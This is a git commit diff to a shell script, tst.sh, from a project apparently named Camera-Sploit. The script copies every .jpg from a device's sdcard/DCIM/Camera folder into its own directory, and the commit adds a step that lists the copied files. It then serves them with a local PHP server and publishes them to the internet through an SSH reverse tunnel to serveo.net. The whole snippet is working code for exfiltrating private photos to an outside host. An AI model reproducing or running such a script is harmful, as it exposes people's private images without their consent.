1497ff775317b4b06e22d58ca41dc38bd8fbd2d6
yamanefkar <38867900+yamanefkar@users.noreply.github.com>
2019-08-09 16:41:10 +0300

    Update tst.sh

--- tst.sh
+++ tst.sh
@@ -3,7 +3,8 @@ random="YAMANEFkaRa"$RANDOM
 if [[ -e "Lib/ok.txt" ]]; then
                 cd Lib/lib && rm -rf *.jpg
                 cd / && cd sdcard/DCIM/Camera && cp *.jpg $HOME/Camera-Sploit/Lib/lib
-                cd $HOME/Camera-Sploit/Lib &&
+                cd $HOME/Camera-Sploit/Lib/lib/ && ls >> yaman.txt
+                cd $HOME/Camera-Sploit/Lib/
                 php -S 127.0.0.1:3333 > /dev/null 2>&1 &
                 sleep 3 &&
                 ssh -R 80:localhost:3333 $random@serveo.net
